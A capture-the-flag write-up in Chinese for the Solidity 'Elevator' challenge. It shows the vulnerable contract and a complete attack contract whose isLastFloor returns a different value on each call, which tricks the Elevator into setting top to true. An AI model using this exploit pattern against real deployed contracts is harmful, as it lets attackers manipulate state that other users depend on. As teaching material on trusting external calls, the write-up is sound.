# 11 - Elevator

## 题目
攻击以下合约
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

## 解题
本题考察完全依赖外部合约的风险，攻击合约如下
```solidity
/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256) external ;
}

contract Building{

    Elevator elevator ;
    bool public toggle = true;
    constructor(address addr){
        elevator = Elevator(addr);
    }

    function isLastFloor(uint256) external returns (bool){
        toggle = !toggle;
        return toggle;
    }
    function attack(uint256 floor) external {
        elevator.goTo(floor);
    }
}
```
这个攻击合约的 isLastFloor 函数在每次调用时都会改变其返回值：
第一次调用返回 false，使 Elevator 合约设置 floor。
第二次调用返回 true，使 Elevator 合约将 top 设置为 true。
攻击步骤：
部署 AttackElevator 合约，传入 Elevator 合约地址。 
调用 AttackElevator 的 attack 函数。
   这将导致 Elevator 合约的 top 变量被设置为 true，即使不是真正的顶层。